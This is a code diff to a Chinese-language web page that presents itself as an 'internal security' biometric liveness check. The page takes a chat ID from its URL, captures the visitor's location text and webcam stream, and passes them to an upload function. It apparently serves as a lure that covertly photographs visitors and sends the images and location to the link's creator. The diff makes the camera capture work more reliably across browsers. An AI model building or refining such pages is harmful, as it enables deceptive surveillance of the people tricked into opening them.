@@ -30,20 +30,6 @@
             border: 1px solid #333;
             max-width: 600px;
         }
-
-        #device-select-container {
-            margin: 15px 0;
-            display: none;
-        }
-
-        select {
-            padding: 10px;
-            font-size: 16px;
-            border-radius: 5px;
-            background: #222;
-            color: white;
-            border: 1px solid #00ffcc;
-        }
         
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
         button:hover { background: #00b386; color: white; }
@@ -55,12 +41,6 @@
     <div id="app">
         <h2>🛡️ 内部安全：生物特征活体检测</h2>
         <div id="status">点击开始以进行身份核验</div>
-        
-        <div id="device-select-container">
-            <label for="cameraSelect">选择摄像头设备：</label>
-            <select id="cameraSelect"></select>
-            <button id="confirmCamBtn" style="margin-left: 10px; padding: 10px 20px; font-size: 16px;">确认</button>
-        </div>
 
         <div id="video-container">
             <video id="video" autoplay playsinline muted></video>
@@ -79,9 +59,6 @@
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
-        const deviceSelectContainer = document.getElementById('device-select-container');
-        const cameraSelect = document.getElementById('cameraSelect');
-        const confirmCamBtn = document.getElementById('confirmCamBtn');
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
         function showError(errName, errMessage) {
@@ -89,9 +66,9 @@
                 <p>⚠️ <b>错误类型：</b> ${errName || '未知错误'}</p>
                 <p>💬 <b>详细信息：</b> ${errMessage || '无法启动视频源。'}</p>
                 <p style="font-size: 14px; color: #aaa; margin-top: 10px;">
-                   💡 <b>电脑端排查建议：</b><br>
-                   1. 请关闭微信、腾讯会议或 OBS 等可能占用摄像头的后台应用。<br>
-                   2. 检查 Windows 或 Mac 系统的摄像头隐私权限。
+                   💡 <b>排查建议：</b><br>
+                   1. 请尝试更换一个浏览器（如 Edge 或 Chrome 主流版本）。<br>
+                   2. 检查电脑系统隐私设置是否完全放开了摄像头。
                 </p>
                 <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px; display:block; width:100%;">重试</button>
             </div>`;
@@ -102,7 +79,7 @@
             if ('speechSynthesis' in window) {
                 window.speechSynthesis.cancel();
                 const utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = 'zh-CN'; // 强制指定中文语音
+                utterance.lang = 'zh-CN';
                 utterance.rate = 1.0;
                 utterance.pitch = 1.0;
                 utterance.onend = () => { if (callback) callback(); };
@@ -131,45 +108,18 @@
             }
 
             try {
-                status.innerText = "正在扫描可用摄像头...";
+                status.innerText = "正在初始化摄像头传感器...";
                 
-                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                tempStream.getTracks().forEach(t => t.stop());
-
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(d => d.kind === 'videoinput');
-
-                if (videoDevices.length > 1) {
-                    cameraSelect.innerHTML = '';
-                    videoDevices.forEach((dev, index) => {
-                        const option = document.createElement('option');
-                        option.value = dev.deviceId;
-                        option.text = dev.label || `摄像头 ${index + 1}`;
-                        cameraSelect.appendChild(option);
-                    });
-                    
-                    status.innerText = "请选择正在使用的物理摄像头：";
-                    deviceSelectContainer.style.display = 'block';
-
-                    confirmCamBtn.onclick = () => {
-                        deviceSelectContainer.style.display = 'none';
-                        const selectedDeviceId = cameraSelect.value;
-                        startCameraStream({ video: { deviceId: { exact: selectedDeviceId } } }, locationText);
-                    };
-                } else {
-                    startCameraStream({ video: true }, locationText);
+                // 极简兼容方案：同时尝试获取音频和视频，或者只取最基础的视频流
+                // 某些电脑端浏览器如果带了严格的约束会报错，这里使用最宽松的配置
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                } catch (e) {
+                    // 如果标准模式失败，尝试降级兼容参数
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } } });
                 }
 
-            } catch (err) {
-                console.error("Camera scan error:", err);
-                showError(err.name, err.message);
-            }
-        });
-
-        async function startCameraStream(constraints, locationText) {
-            try {
-                status.innerText = "正在初始化摄像头传感器...";
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
                 videoContainer.style.display = 'block';
 
@@ -190,11 +140,12 @@
                         });
                     }, 3000);
                 });
+
             } catch (err) {
                 console.error("Camera start error:", err);
                 showError(err.name, err.message);
             }
-        }
+        });
 
         async function captureAndUpload(stream, locationText) {
             status.innerText = "正在处理生物特征数据...";
